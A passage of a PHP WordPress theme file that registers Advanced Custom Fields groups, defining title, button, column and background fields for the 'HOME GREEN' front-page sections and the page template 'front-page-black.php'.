                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa4682c91b5',
                'label' => 'Background Image',
                'name' => 'background_image_s6',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa4682c91b4',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s6',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4681c91b3',
                'label' => 'Background Position',
                'name' => 'background_position_s6',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4681c91b2',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s6',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4681c91b1',
                'label' => 'Background Size',
                'name' => 'background_size_s6',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa0407ce293',
                'label' => 'Session 7',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fa0407ce292',
                'label' => 'Title',
                'name' => 'title_s7',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa0407ce291',
                'label' => 'Subtitle',
                'name' => 'subtitle_s7',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa3c0abb8a7',
                'label' => 'Link button',
                'name' => 'link_button_s7',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa3c1412d1a',
                'label' => 'Button text',
                'name' => 'button_text_s7',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa4681c91b0',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa4681c91af',
                'label' => 'Background Color',
                'name' => 'background_color_s7',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa4681c91ae',
                'label' => 'Background Image',
                'name' => 'background_image_s7',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa4680c91ad',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s7',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4680c91ac',
                'label' => 'Background Position',
                'name' => 'background_position_s7',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4680c91ab',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s7',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa4680c91aa',
                'label' => 'Background Size',
                'name' => 'background_size_s7',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59f9f025a3bfb',
                'label' => 'Session 8',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_59fa467dc919b',
                'label' => 'Title',
                'name' => 'title_s8',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa467dc919a',
                'label' => 'Subtitle',
                'name' => 'subtitle_s8',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8e4a1a291a',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_59e8e31fa2917',
                'label' => 'Link',
                'name' => 'link_button_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8e247a2914',
                'label' => 'Image',
                'name' => 'image_1',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59e8e282a2915',
                'label' => 'Title',
                'name' => 'title_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8e2b6a2916',
                'label' => 'Content text',
                'name' => 'content_text_1',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59e8e3b0a2918',
                'label' => 'Button text',
                'name' => 'button_text_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8e4f6a291b',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_59e8e53ea291f',
                'label' => 'Link',
                'name' => 'link_button_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8e533a291c',
                'label' => 'Image',
                'name' => 'image_2',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59e8e536a291d',
                'label' => 'Title',
                'name' => 'title_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8e53aa291e',
                'label' => 'Content text',
                'name' => 'content_text_2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59e8e542a2920',
                'label' => 'Button text',
                'name' => 'button_text_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8f54fa2aa2',
                'label' => 'Third column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_59e8f54ba2a9e',
                'label' => 'Link',
                'name' => 'link_button_3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8f54ea2aa1',
                'label' => 'Image',
                'name' => 'image_3',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59e8f54da2aa0',
                'label' => 'Title',
                'name' => 'title_3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59e8f54ca2a9f',
                'label' => 'Content text',
                'name' => 'content_text_3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_59fa3c1112d0b',
                'label' => 'Button',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Button</strong></p>',
            ),
            array (
                'key' => 'field_59e8f549a2a9d',
                'label' => 'Button text',
                'name' => 'button_text_3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_59fa4680c91a9',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_59fa467fc91a8',
                'label' => 'Background Color',
                'name' => 'background_color_s8',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_59fa467fc91a7',
                'label' => 'Background Image',
                'name' => 'background_image_s8',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_59fa467fc91a6',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s8',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa467fc91a5',
                'label' => 'Background Position',
                'name' => 'background_position_s8',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa467fc91a4',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s8',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_59fa467fc91a3',
                'label' => 'Background Size',
                'name' => 'background_size_s8',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
        ),
        'location' => array (
            array (
                array (
                    'param' => 'page_template',
                    'operator' => '==',
                    'value' => 'front-page-black.php',
                    'order_no' => 0,
                    'group_no' => 0,
                ),
            ),
        ),
        'options' => array (
            'position' => 'normal',
            'layout' => 'no_box',
            'hide_on_screen' => array (
                0 => 'the_content',
            ),
        ),
        'menu_order' => -1,
    ));
}
if(function_exists("register_field_group"))
{
    register_field_group(array (
        'id' => 'acf_home_green',
        'title' => 'HOME GREEN',
        'fields' => array (
            array (
                'key' => 'field_5a172aee777f1',
                'label' => 'Top bar header',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a172aee777f0',
                'label' => 'Column content 1',
                'name' => 'column_content_1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aee777ef',
                'label' => 'Column content 2',
                'name' => 'column_content_2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aed777ee',
                'label' => 'Column content 3',
                'name' => 'column_content_3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aed777ed',
                'label' => 'Session 1',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a172aed777eb',
                'label' => 'Content text',
                'name' => 'content_text_s1',
                'type' => 'wysiwyg',
                'default_value' => '',
                'toolbar' => 'full',
                'media_upload' => 'yes',
            ),
            array (
                'key' => 'field_5a172aec777e8',
                'label' => 'Top image background',
                'name' => 'top_image_background_s1',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172aed777ea',
                'label' => 'Image for mobile',
                'name' => 'image_for_mobile_s1',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172aec777e7',
                'label' => 'Link button',
                'name' => 'link_button_s1',
                'type' => 'page_link',
                'post_type' => array (
                    0 => 'page',
                ),
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a172aec777e6',
                'label' => 'Button text',
                'name' => 'button_text_s1',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aec777e5',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a172aec777e4',
                'label' => 'Background Color',
                'name' => 'background_color_s1',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a172aeb777e3',
                'label' => 'Background Image',
                'name' => 'background_image_s1',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172aeb777e2',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s1',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a172aeb777e1',
                'label' => 'Background Position',
                'name' => 'background_position_s1',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a172aeb777e0',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s1',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a172aea777df',
                'label' => 'Background Size',
                'name' => 'background_size_s1',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a172aea777de',
                'label' => 'Session 2',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a172aea777dd',
                'label' => 'Title',
                'name' => 'title_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aea777dc',
                'label' => 'Subtitle',
                'name' => 'subtitle_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172aea777db',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_5a172ae9777da',
                'label' => 'Title',
                'name' => 'title_c1_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172ae9777d9',
                'label' => 'Content Text',
                'name' => 'content_text_c1_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a172ae9777d8',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_5a172ae9777d7',
                'label' => 'Title',
                'name' => 'title_c2_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172ae9777d6',
                'label' => 'Content Text',
                'name' => 'content_text_c2_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a172ae8777d5',
                'label' => 'Third column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_5a172ae8777d4',
                'label' => 'Title',
                'name' => 'title_c3_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172ae8777d3',
                'label' => 'Content Text',
                'name' => 'content_text_c3_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a172ae8777d2',
                'label' => 'Fourth column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Fourth column</strong></p>',
            ),
            array (
                'key' => 'field_5a172ae7777d1',
                'label' => 'Title',
                'name' => 'title_c4_s2',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a172ae7777d0',
                'label' => 'Content Text',
                'name' => 'content_text_c4_s2',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a172ae7777cf',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a172ae7777ce',
                'label' => 'Background Color',
                'name' => 'background_color_s2',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a172ae7777cd',
                'label' => 'Background Image',
                'name' => 'background_image_s2',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a172ae6777cc',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s2',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a172ae6777cb',
                'label' => 'Background Position',
                'name' => 'background_position_s2',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8f9da5f12',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s2',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fb9a5f65',
                'label' => 'Background Size',
                'name' => 'background_size_s2',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fb8a5f64',
                'label' => 'Session 3',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a1d8fb1a5f45',
                'label' => 'Title',
                'name' => 'title_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fb0a5f44',
                'label' => 'Subtitle',
                'name' => 'subtitle_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fb0a5f43',
                'label' => 'First column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>First column</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fb0a5f42',
                'label' => 'Image',
                'name' => 'image_c1_s3',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fb0a5f41',
                'label' => 'Title',
                'name' => 'title_c1_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fb0a5f40',
                'label' => 'Content Text',
                'name' => 'content_text_c1_s3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8fafa5f3f',
                'label' => 'Second column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Second column</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fafa5f3e',
                'label' => 'Image',
                'name' => 'image_c2_s3',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fafa5f3d',
                'label' => 'Title',
                'name' => 'title_c2_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fafa5f3c',
                'label' => 'Content Text',
                'name' => 'content_text_c2_s3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8fafa5f3b',
                'label' => 'Third column',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Third column</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8faea5f3a',
                'label' => 'Image',
                'name' => 'image_c3_s3',
                'type' => 'image',
                'save_format' => 'object',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8faea5f39',
                'label' => 'Title',
                'name' => 'title_c3_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8faea5f38',
                'label' => 'Content Text',
                'name' => 'content_text_c3_s3',
                'type' => 'textarea',
                'default_value' => '',
                'placeholder' => '',
                'maxlength' => '',
                'rows' => '',
                'formatting' => 'br',
            ),
            array (
                'key' => 'field_5a1d8faea5f37',
                'label' => 'Button',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Button</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8faea5f36',
                'label' => 'Link button',
                'name' => 'link_button_s3',
                'type' => 'page_link',
                'post_type' => array (
                    0 => 'page',
                ),
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fada5f35',
                'label' => 'Button text',
                'name' => 'button_text_s3',
                'type' => 'text',
                'default_value' => '',
                'placeholder' => '',
                'prepend' => '',
                'append' => '',
                'formatting' => 'html',
                'maxlength' => '',
            ),
            array (
                'key' => 'field_5a1d8fada5f34',
                'label' => 'Background',
                'name' => '',
                'type' => 'message',
                'message' => '<p style="margin-bottom: -15px;font-size: 126%;color: #fff;background: #0073aa;padding: 10px;"><strong>Background</strong></p>',
            ),
            array (
                'key' => 'field_5a1d8fada5f33',
                'label' => 'Background Color',
                'name' => 'background_color_s3',
                'type' => 'color_picker',
                'default_value' => '',
            ),
            array (
                'key' => 'field_5a1d8fada5f32',
                'label' => 'Background Image',
                'name' => 'background_image_s3',
                'type' => 'image',
                'save_format' => 'url',
                'preview_size' => 'thumbnail',
                'library' => 'all',
            ),
            array (
                'key' => 'field_5a1d8fada5f31',
                'label' => 'Background Attachment',
                'name' => 'background_attachment_s3',
                'type' => 'select',
                'choices' => array (
                    'scroll' => 'Scroll',
                    'fixed' => 'Fixed',
                    'inherit' => 'Inherit',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8faca5f30',
                'label' => 'Background Position',
                'name' => 'background_position_s3',
                'type' => 'select',
                'choices' => array (
                    'left top' => 'Left Top',
                    'left center' => 'Left Center',
                    'left bottom' => 'Left Bottom',
                    'right top' => 'Right Top',
                    'right center' => 'Right Center',
                    'right bottom' => 'Right Bottom',
                    'center top' => 'Center Top',
                    'center center' => 'Center Center',
                    'center bottom' => 'Center Bottom',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8faca5f2f',
                'label' => 'Background Repeat',
                'name' => 'background_repeat_s3',
                'type' => 'select',
                'choices' => array (
                    'no-repeat' => 'No Repeat',
                    'repeat-x' => 'Horizontal Repeat',
                    'repeat-y' => 'Vertically Repeat',
                    'repeat' => 'Repeat both horizontal & vertical',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8faca5f2e',
                'label' => 'Background Size',
                'name' => 'background_size_s3',
                'type' => 'select',
                'choices' => array (
                    'auto' => 'Auto',
                    'initial' => 'Initial',
                    'contain' => 'Contain',
                    'cover' => 'Cover',
                ),
                'default_value' => '',
                'allow_null' => 1,
                'multiple' => 0,
            ),
            array (
                'key' => 'field_5a1d8fb4a5f52',
                'label' => 'Session 4',
                'name' => '',
                'type' => 'tab',
            ),
            array (
                'key' => 'field_5a1d8fb3a5f51',
                'label' => 'Content text',
                'name' => 'content_text_s4',
                'type' => 'wysiwyg',
